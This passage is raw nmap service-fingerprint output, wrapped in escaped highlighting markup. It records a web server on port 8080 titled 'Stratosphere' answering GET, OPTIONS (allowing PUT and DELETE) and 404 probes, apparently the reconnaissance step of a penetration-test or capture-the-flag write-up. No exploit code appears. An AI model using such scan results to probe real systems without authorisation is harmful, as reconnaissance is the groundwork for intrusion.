+SF:ns-serif&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;color:white&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;background-color:#525D76&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;20p&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;20&lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;font-family:Ta
+SF:homa,Arial,sans-serif&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;background:white&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;color:black&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;font-size:12px&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;20
+SF:a&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;20&lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;color:black&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;20a&lt;span class=&quot;se&quot;&gt;\.&lt;/span&gt;name&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;20&lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;color:black&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;20&lt;span class=&quot;se&quot;&gt;\.&lt;/span&gt;line&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;20&lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;height:1
+SF:px&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;background-color:#525D76&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;border:none&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;&amp;lt;/style&amp;gt;&amp;lt;/head&amp;gt;&amp;lt;body&amp;gt;&lt;span class=&quot;s2&quot;&gt;&quot;);
+==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
+SF-Port8080-TCP:V=7.92%I=7%D=10/12%Time=6165EA91%P=x86_64-pc-linux-gnu%r(G
+SF:etRequest,786,&quot;&lt;/span&gt;HTTP/1&lt;span class=&quot;se&quot;&gt;\.&lt;/span&gt;1&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;20200&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;20&lt;span class=&quot;se&quot;&gt;\r\n&lt;/span&gt;Accept-Ranges:&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;20bytes&lt;span class=&quot;se&quot;&gt;\r\n&lt;/span&gt;ETag:
+SF:&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;20W/&lt;span class=&quot;se&quot;&gt;\&quot;&lt;/span&gt;1708-1519762495000&lt;span class=&quot;se&quot;&gt;\&quot;\r\n&lt;/span&gt;Last-Modified:&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;20Tue,&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;2027&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;20Feb&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;20
+SF:2018&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;2020:14:55&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;20GMT&lt;span class=&quot;se&quot;&gt;\r\n&lt;/span&gt;Content-Type:&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;20text/html&lt;span class=&quot;se&quot;&gt;\r\n&lt;/span&gt;Content-Length
+SF::&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;201708&lt;span class=&quot;se&quot;&gt;\r\n&lt;/span&gt;Date:&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;20Tue,&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;2012&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;20Oct&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;202021&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;2020:10:27&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;20GMT&lt;span class=&quot;se&quot;&gt;\r\n&lt;/span&gt;C
+SF:onnection:&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;20close&lt;span class=&quot;se&quot;&gt;\r\n\r\n&lt;/span&gt;&amp;lt;&lt;span class=&quot;o&quot;&gt;!&lt;/span&gt;DOCTYPE&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;20html&amp;gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&amp;lt;html&amp;gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&amp;lt;&lt;span class=&quot;nb&quot;&gt;head&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n\x&lt;/span&gt;20&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;20
+SF:&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;20&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;20&amp;lt;meta&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;20charset&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\&quot;&lt;/span&gt;utf-8&lt;span class=&quot;se&quot;&gt;\&quot;&lt;/span&gt;/&amp;gt;&lt;span class=&quot;se&quot;&gt;\n\x&lt;/span&gt;20&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;20&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;20&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;20&amp;lt;title&amp;gt;Stratosphe
+SF:re&amp;lt;/title&amp;gt;&lt;span class=&quot;se&quot;&gt;\n\x&lt;/span&gt;20&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;20&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;20&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;20&amp;lt;&lt;span class=&quot;nb&quot;&gt;link&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;20rel&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\&quot;&lt;/span&gt;stylesheet&lt;span class=&quot;se&quot;&gt;\&quot;\x&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;20type&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\&quot;&lt;/span&gt;text/
+SF:css&lt;span class=&quot;se&quot;&gt;\&quot;\x&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;20href&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\&quot;&lt;/span&gt;main&lt;span class=&quot;se&quot;&gt;\.&lt;/span&gt;css&lt;span class=&quot;se&quot;&gt;\&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&amp;lt;/head&amp;gt;&lt;span class=&quot;se&quot;&gt;\n\n&lt;/span&gt;&amp;lt;body&amp;gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&amp;lt;div&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;20id&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\&quot;&lt;/span&gt;backgroun
+SF:d&lt;span class=&quot;se&quot;&gt;\&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;&amp;lt;/div&amp;gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&amp;lt;header&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;20id&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\&quot;&lt;/span&gt;main-header&lt;span class=&quot;se&quot;&gt;\&quot;\x&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;20class&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\&quot;&lt;/span&gt;hidden&lt;span class=&quot;se&quot;&gt;\&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n\x&lt;/span&gt;20&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;2
+SF:0&amp;lt;div&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;20class&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\&quot;&lt;/span&gt;container&lt;span class=&quot;se&quot;&gt;\&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n\x&lt;/span&gt;20&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;20&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;20&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;20&amp;lt;div&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;20class&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\&quot;&lt;/span&gt;content-
+SF:wrap&lt;span class=&quot;se&quot;&gt;\&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n\x&lt;/span&gt;20&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;20&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;20&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;20&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;20&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;20&amp;lt;p&amp;gt;&amp;lt;i&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;20class&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\&quot;&lt;/span&gt;fa&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;20fa-diamond&lt;span class=&quot;se&quot;&gt;\&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;&amp;lt;/
+SF:i&amp;gt;&amp;lt;/p&amp;gt;&lt;span class=&quot;se&quot;&gt;\n\x&lt;/span&gt;20&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;20&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;20&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;20&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;20&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;20&amp;lt;nav&amp;gt;&lt;span class=&quot;se&quot;&gt;\n\x&lt;/span&gt;20&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;20&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;20&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;20&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;20&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;20&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;20&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;20
+SF:&amp;lt;a&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;20class&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\&quot;&lt;/span&gt;btn&lt;span class=&quot;se&quot;&gt;\&quot;\x&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;20href&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\&quot;&lt;/span&gt;GettingStarted&lt;span class=&quot;se&quot;&gt;\.&lt;/span&gt;html&lt;span class=&quot;se&quot;&gt;\&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;Get&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;20started&amp;lt;/a&amp;gt;
+SF:&lt;span class=&quot;se&quot;&gt;\n\x&lt;/span&gt;20&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;20&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;20&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;20&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;20&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;20&amp;lt;/nav&amp;gt;&lt;span class=&quot;se&quot;&gt;\n\x&lt;/span&gt;20&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;20&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;20&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;20&amp;lt;/div&amp;gt;&lt;span class=&quot;se&quot;&gt;\n\x&lt;/span&gt;20&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;20&amp;lt;/div
+SF:&amp;gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&amp;lt;/header&amp;gt;&lt;span class=&quot;se&quot;&gt;\n\n&lt;/span&gt;&amp;lt;section&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;20id&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\&quot;&lt;/span&gt;greeting&lt;span class=&quot;se&quot;&gt;\&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n\x&lt;/span&gt;20&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;20&amp;lt;div&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;20class&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\&quot;&lt;/span&gt;c
+SF:ontainer&lt;span class=&quot;se&quot;&gt;\&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n\x&lt;/span&gt;20&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;20&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;20&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;20&amp;lt;div&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;20class&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\&quot;&lt;/span&gt;content-wrap&lt;span class=&quot;se&quot;&gt;\&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n\x&lt;/span&gt;20&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;20&lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;
+SF:x20&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;20&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;20&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;20&amp;lt;h1&amp;gt;Stratosphere&amp;lt;br&amp;gt;We&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;20protect&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;20your&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;20credit&lt;span class=&quot;se&quot;&gt;\.&lt;/span&gt;&amp;lt;/h
+SF:1&amp;gt;&lt;span class=&quot;se&quot;&gt;\n\x&lt;/span&gt;20&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;20&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;20&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;20&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;20&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;20&amp;lt;a&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;20class&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\&quot;&lt;/span&gt;btn&lt;span class=&quot;se&quot;&gt;\&quot;\x&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;20href&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\&quot;&lt;/span&gt;GettingStarte
+SF:d&lt;span class=&quot;se&quot;&gt;\.&lt;/span&gt;html&lt;span class=&quot;se&quot;&gt;\&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;Get&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;20started&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;20now&amp;lt;/a&amp;gt;&lt;span class=&quot;se&quot;&gt;\n\x&lt;/span&gt;20&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;20&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;20&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;20&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;20&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;20&amp;lt;p&amp;gt;&amp;lt;i&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;20c
+SF:lass&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\&quot;&lt;/span&gt;ar&lt;span class=&quot;s2&quot;&gt;&quot;)%r(HTTPOptions,8A,&quot;&lt;/span&gt;HTTP/1&lt;span class=&quot;se&quot;&gt;\.&lt;/span&gt;1&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;20200&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;20&lt;span class=&quot;se&quot;&gt;\r\n&lt;/span&gt;Allow:&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;20GET,&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;2
+SF:0HEAD,&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;20POST,&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;20PUT,&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;20DELETE,&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;20OPTIONS&lt;span class=&quot;se&quot;&gt;\r\n&lt;/span&gt;Content-Length:&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;200&lt;span class=&quot;se&quot;&gt;\r&lt;/span&gt;
+SF:&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;Date:&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;20Tue,&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;2012&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;20Oct&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;202021&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;2020:10:27&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;20GMT&lt;span class=&quot;se&quot;&gt;\r\n&lt;/span&gt;Connection:&lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;
+SF:x20close&lt;span class=&quot;se&quot;&gt;\r\n\r\n&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;)%r(RTSPRequest,49,&quot;&lt;/span&gt;HTTP/1&lt;span class=&quot;se&quot;&gt;\.&lt;/span&gt;1&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;20400&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;20&lt;span class=&quot;se&quot;&gt;\r\n&lt;/span&gt;Date:&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;20T
+SF:ue,&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;2012&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;20Oct&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;202021&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;2020:10:27&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;20GMT&lt;span class=&quot;se&quot;&gt;\r\n&lt;/span&gt;Connection:&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;20close&lt;span class=&quot;se&quot;&gt;\r\n&lt;/span&gt;
+SF:&lt;span class=&quot;se&quot;&gt;\r\n&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;)%r(FourOhFourRequest,4F6,&quot;&lt;/span&gt;HTTP/1&lt;span class=&quot;se&quot;&gt;\.&lt;/span&gt;1&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;20404&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;20&lt;span class=&quot;se&quot;&gt;\r\n&lt;/span&gt;Content-Type:&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;
+SF:20text/html&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;charset&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;utf-8&lt;span class=&quot;se&quot;&gt;\r\n&lt;/span&gt;Content-Language:&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;20en&lt;span class=&quot;se&quot;&gt;\r\n&lt;/span&gt;Content-Length:
+SF:&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;201114&lt;span class=&quot;se&quot;&gt;\r\n&lt;/span&gt;Date:&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;20Tue,&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;2012&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;20Oct&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;202021&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;2020:10:27&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;20GMT&lt;span class=&quot;se&quot;&gt;\r\n&lt;/span&gt;Co
+SF:nnection:&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;20close&lt;span class=&quot;se&quot;&gt;\r\n\r\n&lt;/span&gt;&amp;lt;&lt;span class=&quot;o&quot;&gt;!&lt;/span&gt;doctype&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;20html&amp;gt;&amp;lt;html&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;20lang&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\&quot;&lt;/span&gt;en&lt;span class=&quot;se&quot;&gt;\&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;&amp;lt;&lt;span class=&quot;nb&quot;&gt;head&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;
+SF:&amp;lt;title&amp;gt;HTTP&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;20Status&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;20404&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;20&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;e2&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;80&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;93&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;20Not&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;20Found&amp;lt;/title&amp;gt;&amp;lt;st
+SF:yle&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;20type&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\&quot;&lt;/span&gt;text/css&lt;span class=&quot;se&quot;&gt;\&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;h1&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;20&lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;font-family:Tahoma,Arial,sans-serif&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;col
+SF:or:white&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;background-color:#525D76&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;font-size:22px&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;20h2&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;20&lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;font-famil
+SF:y:Tahoma,Arial,sans-serif&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;color:white&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;background-color:#525D76&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;font-siz
+SF:e:16px&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;20h3&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;20&lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;font-family:Tahoma,Arial,sans-serif&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;color:white&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;back
+SF:ground-color:#525D76&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;font-size:14px&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;20body&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;20&lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;font-family:Tahoma,Ar
+SF:ial,sans-serif&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;color:black&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;background-color:white&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;20b&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;20&lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;font-famil
+SF:y:Tahoma,Arial,sans-serif&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;color:white&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;background-color:#525D76&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;20p&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;
+SF:20&lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;font-family:Tahoma,Arial,sans-serif&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;background:white&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;color:black&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;fon
+SF:t-size:12px&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;20a&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;20&lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;color:black&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;20a&lt;span class=&quot;se&quot;&gt;\.&lt;/span&gt;name&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;20&lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;color:black&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;20&lt;span class=&quot;se&quot;&gt;\.&lt;/span&gt;
